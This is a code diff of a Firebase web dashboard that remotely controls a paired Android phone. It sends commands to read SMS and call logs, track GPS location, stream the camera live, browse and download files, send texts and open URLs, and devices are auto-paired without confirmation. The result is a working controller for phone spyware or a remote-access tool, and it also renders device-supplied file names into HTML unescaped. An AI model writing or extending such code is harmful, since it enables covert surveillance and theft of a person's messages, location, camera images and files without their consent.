@@ -1,470 +1,387 @@
-// Global state
+// Global variables
 let currentUserId = null;
-let cameraStreamListener = null;
+let currentCamera = 'front';
+let streamListener = null;
 
-// DOM Elements
-const loginOverlay = document.getElementById('loginOverlay');
-const loginEmail = document.getElementById('loginEmail');
-const loginPassword = document.getElementById('loginPassword');
-const loginError = document.getElementById('loginError');
-const btnLogin = document.getElementById('btnLogin');
-const btnGoogleLogin = document.getElementById('btnGoogleLogin');
-const btnSignOut = document.getElementById('btnSignOut');
-
-const dashboardSection = document.getElementById('dashboardSection');
-const pairingSection = document.getElementById('pairingSection');
-const displayPairCode = document.getElementById('displayPairCode');
-const btnRefreshCode = document.getElementById('btnRefreshCode');
-
-const resultPanel = document.getElementById('resultPanel');
-const resultContent = document.getElementById('resultContent');
-const streamPanel = document.getElementById('streamPanel');
-const streamInfo = document.getElementById('streamInfo');
-const cameraStreamImage = document.getElementById('cameraStreamImage');
-const btnStopStream = document.getElementById('btnStopStream');
-
-const statusText = document.getElementById('statusText');
-const batteryStatus = document.getElementById('batteryStatus');
-const pairCodeDisplay = document.getElementById('pairCode');
-
-// Initialize
-document.addEventListener('DOMContentLoaded', () => {
-    checkExistingSession();
-    setupEventListeners();
-});
-
-function checkExistingSession() {
-    auth.onAuthStateChanged((user) => {
-        if (user) {
-            currentUserId = user.uid;
-            checkIfPaired();
-        } else {
-            showLogin();
-        }
-    });
-}
-
+// Setup event listeners
 function setupEventListeners() {
-    btnLogin?.addEventListener('click', signIn);
-    btnGoogleLogin?.addEventListener('click', signInWithGoogle);
-    btnSignOut?.addEventListener('click', signOut);
-    btnRefreshCode?.addEventListener('click', generateNewPairCode);
-    btnStopStream?.addEventListener('click', stopCameraStream);
+    // Auth buttons
+    document.getElementById('btnLogin')?.addEventListener('click', signIn);
+    document.getElementById('btnGoogleLogin')?.addEventListener('click', signInWithGoogle);
+    document.getElementById('btnSignOut')?.addEventListener('click', signOut);
     
-    // Skip Pairing button
-    document.getElementById('btnSkipPairing')?.addEventListener('click', () => {
-        console.log('Skip pairing clicked, forcing dashboard...');
-        showDashboard();
+    // Sidebar navigation
+    document.querySelectorAll('.sidebar-item').forEach(item => {
+        item.addEventListener('click', () => {
+            const section = item.dataset.section;
+            switchSection(section);
+        });
     });
     
-    // SMS Modal
-    document.getElementById('btnSendSmsSubmit')?.addEventListener('click', () => {
-        const phone = document.getElementById('smsPhoneNumber').value.trim();
-        const message = document.getElementById('smsMessage').value.trim();
-        if (phone && message) {
-            sendCommand('send_sms', { phoneNumber: phone, message });
-            bootstrap.Modal.getInstance(document.getElementById('smsModal')).hide();
-        }
+    // Camera controls
+    document.querySelectorAll('.camera-toggle-btn').forEach(btn => {
+        btn.addEventListener('click', () => {
+            document.querySelectorAll('.camera-toggle-btn').forEach(b => b.classList.remove('active'));
+            btn.classList.add('active');
+            currentCamera = btn.dataset.camera;
+        });
     });
     
-    // URL Modal
-    document.getElementById('btnSendUrl')?.addEventListener('click', () => {
-        const url = document.getElementById('urlInput').value.trim();
-        if (url) {
-            sendCommand('open_url', { url });
-            bootstrap.Modal.getInstance(document.getElementById('urlModal')).hide();
-        }
+    document.getElementById('btnStartStream')?.addEventListener('click', () => startCameraStream(currentCamera));
+    document.getElementById('btnStopStream')?.addEventListener('click', stopCameraStream);
+    
+    // Quick actions
+    document.getElementById('btnRingPhone')?.addEventListener('click', ringPhone);
+    document.getElementById('btnGetLocation')?.addEventListener('click', getLocation);
+    document.getElementById('btnGetMessages')?.addEventListener('click', getMessages);
+    document.getElementById('btnGetCallLogs')?.addEventListener('click', getCallLogs);
+    document.getElementById('btnGetFiles')?.addEventListener('click', () => listFiles('/storage/emulated/0'));
+    
+    // Modals
+    document.getElementById('btnSendSMS')?.addEventListener('click', sendSMS);
+    document.getElementById('btnOpenURL')?.addEventListener('click', openURL);
+    
+    // Result panel
+    document.getElementById('btnCloseResult')?.addEventListener('click', () => {
+        document.getElementById('resultPanel').style.display = 'none';
     });
 }
 
-// ========== AUTH ==========
-
-async function signIn() {
-    const email = loginEmail.value.trim();
-    const password = loginPassword.value;
+// Switch sections
+function switchSection(section) {
+    // Update sidebar
+    document.querySelectorAll('.sidebar-item').forEach(item => {
+        item.classList.remove('active');
+    });
+    document.querySelector(`[data-section="${section}"]`)?.classList.add('active');
     
-    if (!email || !password) {
-        showError('Please enter email and password');
-        return;
-    }
+    // Update content
+    document.querySelectorAll('.content-section').forEach(sec => {
+        sec.classList.remove('active');
+    });
+    document.getElementById(`${section}Section`)?.classList.add('active');
+}
+
+// Auth functions
+async function signIn() {
+    const email = document.getElementById('emailInput').value;
+    const password = document.getElementById('passwordInput').value;
     
     try {
         await auth.signInWithEmailAndPassword(email, password);
     } catch (error) {
-        showError(error.message);
+        alert('Login failed: ' + error.message);
     }
 }
 
 async function signInWithGoogle() {
+    const provider = new firebase.auth.GoogleAuthProvider();
     try {
-        const provider = new firebase.auth.GoogleAuthProvider();
         await auth.signInWithPopup(provider);
     } catch (error) {
-        if (error.code !== 'auth/popup-closed-by-user') {
-            showError(error.message);
-        }
+        alert('Google login failed: ' + error.message);
     }
 }
 
 async function signOut() {
     try {
         await auth.signOut();
-        showLogin();
+        location.reload();
     } catch (error) {
-        console.error('Sign out error:', error);
+        alert('Sign out failed: ' + error.message);
     }
 }
 
-function showError(message) {
-    if (loginError) {
-        loginError.textContent = message;
-        loginError.classList.remove('d-none');
+// Auth state listener
+auth.onAuthStateChanged(async (user) => {
+    if (user) {
+        currentUserId = user.uid;
+        console.log('User logged in:', currentUserId);
+        
+        // Hide login, show desktop
+        document.getElementById('loginOverlay').style.display = 'none';
+        document.getElementById('desktopContainer').style.display = 'flex';
+        
+        // Auto-update battery
+        updateBatteryStatus();
+        setInterval(updateBatteryStatus, 5 * 60 * 1000); // Every 5 minutes
+        
+    } else {
+        currentUserId = null;
+        document.getElementById('loginOverlay').style.display = 'flex';
+        document.getElementById('desktopContainer').style.display = 'none';
     }
-}
+});
 
-// ========== UI STATES ==========
-
-function showLogin() {
-    loginOverlay?.classList.remove('d-none');
-    dashboardSection?.classList.add('d-none');
-    pairingSection?.classList.add('d-none');
-}
-
-function showPairing() {
-    loginOverlay?.classList.add('d-none');
-    dashboardSection?.classList.add('d-none');
-    pairingSection?.classList.remove('d-none');
-    generateNewPairCode();
-}
-
-function showDashboard() {
-    loginOverlay?.classList.add('d-none');
-    pairingSection?.classList.add('d-none');
-    dashboardSection?.classList.remove('d-none');
-    loadPairCode();
-    updateBatteryStatus();
-}
-
-// ========== PAIRING ==========
-
-async function checkIfPaired() {
-    try {
-        // First check if any device is paired for this user
-        const devicesSnapshot = await firestore.collection('devices')
-            .where('userId', '==', currentUserId)
-            .where('isPaired', '==', true)
-            .limit(1)
-            .get();
-        
-        if (!devicesSnapshot.empty) {
-            // Device already paired, show dashboard
-            console.log('Device found and paired');
-            showDashboard();
-            return;
-        }
-        
-        // No paired device found, check if there's any device waiting to pair
-        const allDevicesSnapshot = await firestore.collection('devices')
-            .where('userId', '==', currentUserId)
-            .limit(1)
-            .get();
-        
-        if (!allDevicesSnapshot.empty) {
-            // Device exists but not paired, mark as paired automatically
-            const deviceDoc = allDevicesSnapshot.docs[0];
-            await deviceDoc.ref.update({ isPaired: true });
-            console.log('Device auto-paired');
-            showDashboard();
-            return;
-        }
-        
-        // No device at all, show pairing screen
-        console.log('No device found, showing pairing screen');
-        showPairing();
-        
-    } catch (error) {
-        console.error('Check paired error:', error);
-        showPairing();
-    }
-}
-
-async function generateNewPairCode() {
-    if (!currentUserId) return;
-    
-    try {
-        const code = Math.random().toString(36).substring(2, 8).toUpperCase();
-        
-        await firestore.collection('users').doc(currentUserId).set({
-            pairCode: code,
-            email: auth.currentUser.email,
-            updatedAt: firebase.firestore.FieldValue.serverTimestamp()
-        }, { merge: true });
-        
-        if (displayPairCode) {
-            displayPairCode.textContent = code;
-        }
-        
-        listenForPairing();
-    } catch (error) {
-        console.error('Generate code error:', error);
-    }
-}
-
-function listenForPairing() {
-    if (!currentUserId) return;
-    
-    console.log('Listening for device pairing...');
-    
-    // Listen for ANY device with this userId
-    const unsubscribe = firestore.collection('devices')
-        .where('userId', '==', currentUserId)
-        .onSnapshot((snapshot) => {
-            if (!snapshot.empty) {
-                const device = snapshot.docs[0];
-                const deviceData = device.data();
-                
-                console.log('Device detected:', deviceData);
-                
-                // If device exists and is paired, show dashboard
-                if (deviceData.isPaired === true) {
-                    console.log('Device is paired, showing dashboard');
-                    unsubscribe();
-                    showDashboard();
-                } 
-                // If device exists but not paired, auto-pair it
-                else if (deviceData.isPaired === false) {
-                    console.log('Device exists but not paired, auto-pairing...');
-                    device.ref.update({ isPaired: true }).then(() => {
-                        console.log('Device auto-paired successfully');
-                        showDashboard();
-                    });
-                }
-            } else {
-                console.log('No device detected yet, waiting...');
-            }
-        }, (error) => {
-            console.error('Pairing listener error:', error);
-        });
-}
-
-async function loadPairCode() {
-    if (!currentUserId) return;
-    
-    try {
-        const userDoc = await firestore.collection('users').doc(currentUserId).get();
-        const code = userDoc.data()?.pairCode || '------';
-        if (pairCodeDisplay) {
-            pairCodeDisplay.textContent = 'Pair Code: ' + code;
-        }
-    } catch (error) {
-        console.error('Load pair code error:', error);
-    }
-}
-
-// ========== COMMANDS ==========
-
-async function sendCommand(type, data) {
+// Send command function
+async function sendCommand(type, data = {}) {
     if (!currentUserId) {
         alert('Not logged in');
         return null;
     }
     
-    setStatus('Sending command...', 'info');
-    
     try {
-        const commandRef = await firestore
-            .collection('users')
+        const commandRef = firestore.collection('users')
             .doc(currentUserId)
             .collection('commands')
-            .add({
-                type,
-                data,
-                status: 'pending',
-                timestamp: Date.now()
-            });
+            .doc();
+        
+        await commandRef.set({
+            type: type,
+            data: data,
+            status: 'pending',
+            createdAt: firebase.firestore.FieldValue.serverTimestamp()
+        });
+        
+        console.log('Command sent:', type);
         
         // Wait for result
         return await waitForResult(commandRef);
         
     } catch (error) {
         console.error('Send command error:', error);
-        setStatus('Error: ' + error.message, 'danger');
+        showResult({ error: error.message });
         return null;
     }
 }
 
-async function waitForResult(commandRef) {
+async function waitForResult(commandRef, timeout = 30000) {
     return new Promise((resolve, reject) => {
-        const timeout = setTimeout(() => {
+        const timer = setTimeout(() => {
             unsubscribe();
-            setStatus('Command timeout', 'danger');
             reject(new Error('Timeout'));
-        }, 30000);
+        }, timeout);
         
         const unsubscribe = commandRef.onSnapshot((doc) => {
             const data = doc.data();
-            if (data.status === 'completed') {
-                clearTimeout(timeout);
+            if (data && data.status === 'completed') {
+                clearTimeout(timer);
                 unsubscribe();
-                setStatus('Command completed', 'success');
-                showResult(data.result);
                 resolve(data.result);
-            } else if (data.status === 'failed') {
-                clearTimeout(timeout);
-                unsubscribe();
-                setStatus('Command failed: ' + data.error, 'danger');
-                reject(new Error(data.error));
             }
         });
     });
 }
 
-function setStatus(message, type = 'info') {
-    if (statusText) {
-        statusText.textContent = message;
-        statusText.className = `text-muted small text-${type}`;
-    }
-}
-
-// ========== RESULT DISPLAY ==========
-
-function showResult(result) {
-    if (!resultPanel || !resultContent) return;
-    
-    // Special handling for file lists
-    if (result.files && Array.isArray(result.files)) {
-        let html = `<div class="mb-3">
-            <strong>Path:</strong> <code>${result.path}</code>
-            <span class="badge bg-primary ms-2">${result.count} items</span>
-        </div>`;
-        html += '<div class="list-group">';
-        result.files.forEach(file => {
-            const icon = file.isDirectory ? '📁' : '📄';
-            const size = file.isDirectory ? '' : ` <span class="badge bg-secondary">${formatFileSize(file.size)}</span>`;
-            const action = file.isDirectory 
-                ? `onclick="sendCommand('list_files', { path: '${file.path}' })"` 
-                : `onclick="sendCommand('download_file', { path: '${file.path}' })"`;
-            html += `<a href="#" class="list-group-item list-group-item-action" ${action}>
-                ${icon} ${file.name}${size}
-            </a>`;
-        });
-        html += '</div>';
-        resultContent.innerHTML = html;
-        resultPanel.classList.add('show');
-        return;
-    }
-    
-    // Special handling for downloads
-    if (result.data && result.filename) {
-        const isImage = result.mimeType?.startsWith('image/');
-        let html = `<h6>${result.filename} <span class="badge bg-info">${formatFileSize(result.size)}</span></h6>`;
-        if (isImage) {
-            html += `<img src="data:${result.mimeType};base64,${result.data}" class="img-fluid mb-3">`;
-        }
-        html += `<a href="data:${result.mimeType};base64,${result.data}" download="${result.filename}" class="btn btn-primary">
-            <i class="bi bi-download"></i> Download
-        </a>`;
-        resultContent.innerHTML = html;
-        resultPanel.classList.add('show');
-        return;
-    }
-    
-    // Special handling for location
-    if (result.mapsUrl) {
-        let html = `<p><strong>Location:</strong> ${result.latitude}, ${result.longitude}</p>`;
-        html += `<a href="${result.mapsUrl}" target="_blank" class="btn btn-primary">
-            <i class="bi bi-map"></i> Open in Google Maps
-        </a>`;
-        resultContent.innerHTML = html;
-        resultPanel.classList.add('show');
-        return;
-    }
-    
-    // Default JSON display
-    resultContent.innerHTML = `<pre>${JSON.stringify(result, null, 2)}</pre>`;
-    resultPanel.classList.add('show');
-}
-
-function formatFileSize(bytes) {
-    if (bytes < 1024) return bytes + ' B';
-    if (bytes < 1024 * 1024) return (bytes / 1024).toFixed(1) + ' KB';
-    if (bytes < 1024 * 1024 * 1024) return (bytes / (1024 * 1024)).toFixed(1) + ' MB';
-    return (bytes / (1024 * 1024 * 1024)).toFixed(1) + ' GB';
-}
-
-// ========== CAMERA STREAM ==========
-
+// Camera streaming
 async function startCameraStream(camera) {
-    if (!currentUserId) return;
-    
-    streamPanel?.classList.add('show');
-    streamInfo.textContent = `Starting ${camera} camera...`;
-    
     try {
         const result = await sendCommand('start_camera_stream', { camera });
         
-        if (!result || result.message !== "Camera stream started") {
-            throw new Error('Failed to start stream');
+        if (result) {
+            // Show stream UI
+            document.querySelector('.stream-placeholder').style.display = 'none';
+            document.getElementById('cameraStreamImage').style.display = 'block';
+            document.getElementById('streamInfo').style.display = 'block';
+            document.getElementById('btnStartStream').style.display = 'none';
+            document.getElementById('btnStopStream').style.display = 'inline-block';
+            
+            // Listen for frames
+            const database = firebase.database();
+            const streamRef = database.ref(`camera_streams/${currentUserId}`);
+            
+            streamListener = streamRef.on('value', (snapshot) => {
+                const data = snapshot.val();
+                if (data && data.active && data.frame) {
+                    document.getElementById('cameraStreamImage').src = `data:image/jpeg;base64,${data.frame}`;
+                    document.getElementById('streamDetails').textContent = 
+                        `Frame ${data.frameNumber} | ${data.camera} | ${new Date(data.timestamp).toLocaleTimeString()}`;
+                }
+            });
+            
+            showResult(result);
         }
-        
-        // Listen for frames
-        const database = firebase.database();
-        const streamRef = database.ref(`camera_streams/${currentUserId}`);
-        
-        cameraStreamListener = streamRef.on('value', (snapshot) => {
-            const data = snapshot.val();
-            if (data && data.frame && data.active) {
-                cameraStreamImage.src = `data:image/jpeg;base64,${data.frame}`;
-                const time = new Date(data.timestamp).toLocaleTimeString();
-                streamInfo.innerHTML = `<span class="badge bg-success">● LIVE</span> Frame ${data.frameNumber} | ${camera} | ${time}`;
-            } else if (data && !data.active) {
-                stopCameraStream();
-            }
-        });
-        
     } catch (error) {
-        console.error('Stream error:', error);
-        streamPanel?.classList.remove('show');
+        console.error('Camera stream error:', error);
+        showResult({ error: error.message });
     }
 }
 
 async function stopCameraStream() {
-    if (!currentUserId) return;
-    
     try {
-        if (cameraStreamListener) {
+        // Stop listening
+        if (streamListener) {
             const database = firebase.database();
-            database.ref(`camera_streams/${currentUserId}`).off('value', cameraStreamListener);
-            cameraStreamListener = null;
+            const streamRef = database.ref(`camera_streams/${currentUserId}`);
+            streamRef.off('value', streamListener);
+            streamListener = null;
         }
         
-        await sendCommand('stop_camera_stream', {});
-        streamPanel?.classList.remove('show');
+        const result = await sendCommand('stop_camera_stream');
         
+        // Reset UI
+        document.querySelector('.stream-placeholder').style.display = 'block';
+        document.getElementById('cameraStreamImage').style.display = 'none';
+        document.getElementById('streamInfo').style.display = 'none';
+        document.getElementById('btnStartStream').style.display = 'inline-block';
+        document.getElementById('btnStopStream').style.display = 'none';
+        
+        showResult(result);
     } catch (error) {
         console.error('Stop stream error:', error);
     }
 }
 
-// ========== BATTERY STATUS ==========
+// Quick actions
+async function ringPhone() {
+    const result = await sendCommand('ring_phone');
+    showResult(result);
+}
+
+async function getLocation() {
+    const result = await sendCommand('get_location');
+    if (result && result.latitude && result.longitude) {
+        const mapsUrl = `https://www.google.com/maps?q=${result.latitude},${result.longitude}`;
+        result.mapsLink = `<a href="${mapsUrl}" target="_blank" class="btn btn-primary btn-sm mt-2">
+            <i class="bi bi-map"></i> Open in Google Maps
+        </a>`;
+    }
+    showResult(result);
+}
+
+async function getMessages() {
+    const result = await sendCommand('read_sms');
+    showResult(result);
+}
+
+async function getCallLogs() {
+    const result = await sendCommand('get_call_logs');
+    showResult(result);
+}
+
+async function listFiles(path) {
+    const result = await sendCommand('list_files', { path });
+    if (result && result.files) {
+        displayFiles(result.files, path);
+    } else {
+        showResult(result);
+    }
+}
+
+async function sendSMS() {
+    const phone = document.getElementById('smsPhoneNumber').value;
+    const message = document.getElementById('smsMessage').value;
+    
+    if (!phone || !message) {
+        alert('Please fill in all fields');
+        return;
+    }
+    
+    const result = await sendCommand('send_sms', { phoneNumber: phone, message });
+    showResult(result);
+    
+    // Close modal
+    bootstrap.Modal.getInstance(document.getElementById('smsModal'))?.hide();
+}
+
+async function openURL() {
+    const url = document.getElementById('urlInput').value;
+    
+    if (!url) {
+        alert('Please enter a URL');
+        return;
+    }
+    
+    const result = await sendCommand('open_url', { url });
+    showResult(result);
+    
+    // Close modal
+    bootstrap.Modal.getInstance(document.getElementById('urlModal'))?.hide();
+}
+
+// Display functions
+function displayFiles(files, currentPath) {
+    const container = document.getElementById('filesContent');
+    
+    let html = `<div class="mb-3"><strong>Path:</strong> ${currentPath}</div>`;
+    html += '<div class="list-group">';
+    
+    files.forEach(file => {
+        const icon = file.isDirectory ? 'bi-folder-fill' : 'bi-file-earmark';
+        const color = file.isDirectory ? 'text-warning' : 'text-primary';
+        
+        html += `
+            <div class="list-group-item list-group-item-action d-flex justify-content-between align-items-center" 
+                 onclick="${file.isDirectory ? `listFiles('${file.path}')` : `downloadFile('${file.path}')`}"
+                 style="cursor: pointer;">
+                <div>
+                    <i class="bi ${icon} ${color}"></i>
+                    <span class="ms-2">${file.name}</span>
+                </div>
+                <span class="badge bg-secondary">${formatFileSize(file.size)}</span>
+            </div>
+        `;
+    });
+    
+    html += '</div>';
+    container.innerHTML = html;
+}
+
+async function downloadFile(path) {
+    const result = await sendCommand('download_file', { path });
+    if (result && result.data) {
+        // Show preview if image
+        if (result.mimeType && result.mimeType.startsWith('image/')) {
+            const img = `<img src="data:${result.mimeType};base64,${result.data}" class="img-fluid mb-3">`;
+            result.preview = img;
+        }
+        
+        // Add download button
+        result.downloadBtn = `
+            <a href="data:${result.mimeType};base64,${result.data}" 
+               download="${result.fileName}" 
+               class="btn btn-primary btn-sm">
+                <i class="bi bi-download"></i> Download ${result.fileName}
+            </a>
+        `;
+    }
+    showResult(result);
+}
+
+function formatFileSize(bytes) {
+    if (bytes === 0) return '0 B';
+    const k = 1024;
+    const sizes = ['B', 'KB', 'MB', 'GB'];
+    const i = Math.floor(Math.log(bytes) / Math.log(k));
+    return Math.round(bytes / Math.pow(k, i) * 100) / 100 + ' ' + sizes[i];
+}
 
 async function updateBatteryStatus() {
-    if (!currentUserId) return;
-    
     try {
-        const result = await sendCommand('get_battery_info', {});
-        if (result && batteryStatus) {
-            const icon = result.isCharging ? 'battery-charging' : 'battery-full';
-            batteryStatus.innerHTML = `<i class="bi bi-${icon}"></i> ${result.percentage}%`;
+        const result = await sendCommand('get_battery_info');
+        if (result && result.level !== undefined) {
+            const icon = result.isCharging ? 'bi-battery-charging' : 'bi-battery-full';
+            document.getElementById('batteryStatus').innerHTML = `
+                <i class="bi ${icon}"></i>
+                <span>${result.level}%</span>
+            `;
         }
     } catch (error) {
         console.error('Battery update error:', error);
     }
 }
 
-// Auto-update battery every 5 minutes
-setInterval(() => {
-    if (currentUserId && dashboardSection && !dashboardSection.classList.contains('d-none')) {
-        updateBatteryStatus();
+// Show result panel
+function showResult(result) {
+    const panel = document.getElementById('resultPanel');
+    const content = document.getElementById('resultContent');
+    
+    if (!result) {
+        content.innerHTML = '<div class="alert alert-warning">No result</div>';
+    } else if (result.error) {
+        content.innerHTML = `<div class="alert alert-danger">${result.error}</div>`;
+    } else if (result.preview) {
+        content.innerHTML = result.preview + (result.downloadBtn || '');
+    } else if (result.mapsLink) {
+        content.innerHTML = `<pre>${JSON.stringify(result, null, 2)}</pre>${result.mapsLink}`;
+    } else if (result.downloadBtn) {
+        content.innerHTML = `<pre>${JSON.stringify(result, null, 2)}</pre>${result.downloadBtn}`;
+    } else {
+        content.innerHTML = `<pre>${JSON.stringify(result, null, 2)}</pre>`;
     }
-}, 5 * 60 * 1000);
+    
+    panel.style.display = 'block';
+}
+
+// Initialize
+setupEventListeners();
